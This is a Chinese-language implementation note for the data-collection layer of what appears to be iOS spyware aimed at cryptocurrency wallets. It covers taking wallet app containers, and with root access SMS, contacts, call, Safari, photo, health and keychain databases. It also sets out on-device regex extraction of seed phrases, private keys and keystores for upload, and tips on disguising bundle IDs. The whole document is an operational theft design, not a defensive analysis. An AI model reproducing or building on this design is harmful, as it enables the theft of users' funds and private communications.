# 05 · 采集层实现说明

> 对应代码：`源码版/src/Collect/`（804 行）+ `Container/OWContainerPass` + `Keys/OWKeys`
> 资源：`Resources/targets.plist`、`Resources/system_targets.plist`、`Resources/bip39.txt`

---

## 1. 采集分三层，权限要求完全不同

| 层 | 通道 | 能拿到什么 | 权限要求 |
|---|---|---|---|
| **L1 容器文件** | B（MCM 租约） | 各钱包 App 沙箱 + App Group 共享容器 | 无需内核，用户态即可 |
| **L2 系统库** | A（内核 root） | 短信 / 通讯录 / 通话 / Safari / 相册 / 日历 / 健康 | 必须 root + 脱沙箱 |
| **L3 钥匙** | A | keychain-2.db、metadata_class_keys.plist、class keys | 必须 root + securityd attach |

**别指望 B 能出 L2/L3** —— 这不是实现问题，是 house_arrest 租约机制的作用域决定的：
sms.db 和 AddressBook.sqlitedb 属于 smsd / contactsd 的系统守护进程属地，不在任何容器之下。

反过来，**L1 是唯一不随 iOS 升级失效的层**。内核侧天花板越收越紧（18.7.2+ / 26.1+ / A18+ 全无解），
L1 始终可达 —— 所以 L1 的采集完整度决定了整个项目的下限。

## 2. L1：容器采集（`OWContainerPass`）

### 2.1 流程

```
pass1  枚举 MCMAppDataContainer 全量 → 按 bundleId 命中 targets.plist → 采集
       枚举 MCMSharedDataContainer  → App Group（备忘录 group.com.apple.notes 走这条）
       ↓
       写 container_map.plist（bundleId → 容器路径，用于后续按实机校准清单）
pass2  清单里有、但 pass1 没枚举到的 → containerWithContentClass:identifier: 定向再取
       ↓
兜底   定义件路径 + 关键字/扩展名扫描（防止版本差异导致路径对不上）
```

### 2.2 每个目标三种采集模式

`targets.plist` 里 `mode` 字段：

| mode | 行为 | 适用 |
|---|---|---|
| `files` | 按 `paths` 精确拷定义件 + 关键字/扩展名兜底扫 | 绝大多数钱包 |
| `whole_container` | 整容器打成 zip | Bitpie（文件布局不定） |
| `scan` | 只走关键字/扩展名扫 | 兜底 |

### 2.3 三个容易踩的坑（已在代码里处理）

1. **sqlite 边车** —— 只拷 `main.sqlite3` 不带 `-wal`/`-shm`，WAL 模式下未 checkpoint 的数据全在边车里。代码自动附带。
2. **空库误判** —— 表结构在但所有表 0 行 = 设备上没建钱包，不是采集失败。`OWFileGate.looksEmptyDatabaseAtPath:` 专门识别，打日志 `[空库/未建钱包]`，且 `valid=NO` 不触发 done。
3. **keybag 未解锁** —— 重启后未解锁（BFU）或锁屏时 `NSFileProtectionComplete` 的文件读不到。直接判定"没装钱包"是错的，代码先等 `protectedDataAvailable`（默认 120s 超时）。

### 2.4 加一个新钱包

在 `targets.plist` 的 `wallets` 数组加一条：

```xml
<dict>
    <key>name</key><string>SomeWallet</string>
    <key>bundleId</key><string>com.example.wallet</string>
    <key>mode</key><string>files</string>
    <key>paths</key>
    <array><string>Documents/wallet.db</string></array>
    <key>keywords</key><array><string>wallet</string><string>keystore</string></array>
    <key>exts</key><array><string>sqlite</string><string>json</string></array>
</dict>
```

`bundleId` 必须按实机校准 —— 跑一遍之后看 `ow_collect/container_map.plist`，
MCM 枚举出来的 identifier 才是准的（很多钱包带团队前缀、大小写、后缀差异）。

## 3. L2：系统库采集（`OWSystemGrab`）

目标表在 `Resources/system_targets.plist`，支持 `paths`（精确文件）和 `dirs`（整目录打包）两种。
默认条目：SMS、AddressBook、CallHistory、Safari、Calendar、Photos、Health、MailIndex、Keychains、UserDictionary、NotesLegacy。

拷贝两级：

1. `NSFileManager copyItemAtPath:` —— 已 root 且脱沙箱时最快；
2. 失败则 `OWRemoteCall.copyPrivilegedFile:to:` —— 走 vnode 层读。

**一条都读不到记 skip，不判失败。** 容器-only 场景下 L2 全 skip 是预期结果，
不能因此把整轮判成失败而阻止 done。

加新条目直接往 plist 里加，`requireRoot` 字段控制是否只在 root 后尝试。

## 4. 端上明文抽取（`OWExtractor`）—— 最值钱的一块

### 4.1 为什么要在端上做

容器通道拿到的大部分是密文库，但仍有相当比例的 App 会缓存明文：
助记词备份提示、keystore JSON、导出记录、日志、临时文件。

整库上传再服务端解析的问题：体积大、传输失败率高、依赖服务端先具备解析能力。
端上直接命中则：上传几 KB、不受传输影响、不依赖服务端。

### 4.2 扫什么

| 类型 | 处理方式 |
|---|---|
| sqlite / realm | 逐表逐行逐列；TEXT 直接扫、BLOB 取可打印部分（可打印率 <75% 判为密文跳过）、INTEGER 大数转十进制 |
| plist | 反序列化后展平成字符串 |
| json | 同上，失败退化为原文 |
| 其他文件 | 按可打印率判定文本/二进制，文本直接扫 |

规模控制：单文件 64MB 上限、单表 2 万行上限、总命中 2000 条上限。
防止几十万行的聊天库把内存/时间拖死。

### 4.3 匹配规则

| kind | 判据 | 备注 |
|---|---|---|
| `mnemonic` | 12/15/18/21/24 个连续小写词 | 过 BIP39 词表校验；60% 以下命中才丢弃 |
| `privkey_hex` | `\b[0-9a-fA-F]{64}\b` | 误报偏高，但漏报代价更大 |
| `wif` | `[5KL][1-9A-HJ-NP-Za-km-z]{50,51}` | BTC WIF |
| `keystore` | JSON 含 `crypto` / `x-priv-48` / `encseed` | |
| `json_field` | `mnemonic`/`privateKey`/`seed`/`xprv` 等命名键的值 | **命中率最高的一类** |
| `addr_eth` | `0x[a-fA-F0-9]{40}` | |
| `addr_tron` | `T[1-9A-HJ-NP-Za-km-z]{33}` | |
| `addr_btc` | legacy + bech32 | |
| `addr_sol` | base58 32-44 | **需上下文含 sol/phantom/solflare/spl-token 才记**（否则误报爆炸） |

`json_field` 这条值得单独说：绝大多数钱包的本地存储是 JSON/REALM 落盘，
键名直接用 `mnemonic` / `privateKey` 是常态，正则取命名键的值是最省力也最准的一条路。

### 4.4 产物

- `hits.json` —— 结构化：`{count, summary:{kind:数量}, hits:[{kind,value,file,label,where,verified}]}`
- `hits_plain.txt` —— 人工核对用，一行一条

上传 kind 为 `hits`。助记词/私钥/WIF/keystore 四类命中会直接置 `OWStateKeyKeysAcquired`，
参与 OWRoute 的 done 判定 —— **即使内核通道完全没通，只要抽到了明文，这一轮就算有成果**。

## 5. L3：钥匙层补的两块

1. **`grabKeychainDirWithRemote:`** —— 之前只拷 `keychain-2.db`。
   服务端离线解 `v_Data` 必须要有 `metadata_class_keys.plist`，只给 db 等于只给了一半。
2. **`exportKeychainMetadataFromDB:`** —— `acct` / `svce` / `agrp` / `musr` 这几列**不加密**。
   即使 `v_Data` 完全解不开，凭 `agrp + svce + acct` 也能：
   - 判定设备上装了哪些钱包（agrp 通常是 App 的 team id / bundle id 前缀）；
   - 拿到地址类标识（不少钱包把地址写进 `acct`）。

   这一层**不依赖 class keys**，是"内核通了但 AKS 没通"场景下唯一还能出东西的路径。
   列存在性用 `PRAGMA table_info` 逐个探测，不硬编码 schema。

## 6. 日志判读

| 日志 | 含义 | 该做什么 |
|---|---|---|
| `B: pass1 枚举 App Data 容器 N 个` | N=0 → MCM 授权被拒 | 查 bundle id 伪装 / entitlements |
| `B: 采集 X (bundle) mode=files` | 命中目标 | — |
| `B: 取得 f (n B) [空库/未建钱包]` | 文件拿到了，设备上没建钱包 | 不是 bug，无需处理 |
| `B: keybag 未解锁，等待` | 设备锁屏/BFU | 等解锁后重跑 |
| `B: 整容器打包 X -> n B` | Bitpie 类成功 | — |
| `B: 整容器打包失败 X` | 无权限或容器空 | 看是否退回兜底扫描 |
| `Sys: X skip（无权限或不存在）` | L2 需要 root | 容器-only 场景属预期 |
| `Extract: BIP39 词表 2048 词` | 词表加载成功 | 没有这行 = 资源没打进包 |
| `Extract: X 命中 N 条` | 端上抽到明文 | 看 `hits.json` 的 kind 分布 |
| `Keys: keychain 明文元数据 N 行（钱包相关 M）` | M>0 即有钱包指纹 | — |
| `Keys: Keychains 目录取得 N 项（class keys plist=有）` | 有 plist 才能离线解 | — |

## 7. 已知限制

1. **`addr_sol` / `privkey_hex` 误报** —— Safari、Photos 这类大库容易出假命中。真机样本回来后需要调阈值或加上下文约束。
2. **BLOB 只取可打印部分** —— 若钱包把助记词存在加密 blob 里，端上抽不到，只能走 L3 或服务端离线解。
3. **相册只取索引不取媒体** —— `Photos.sqlite` 有，DCIM 里的原图不取（体积不划算）。
4. **Targets 需实机校准** —— `targets.plist` 里 11 条是按常识填的，跑一遍后按 `container_map.plist` 对一遍。
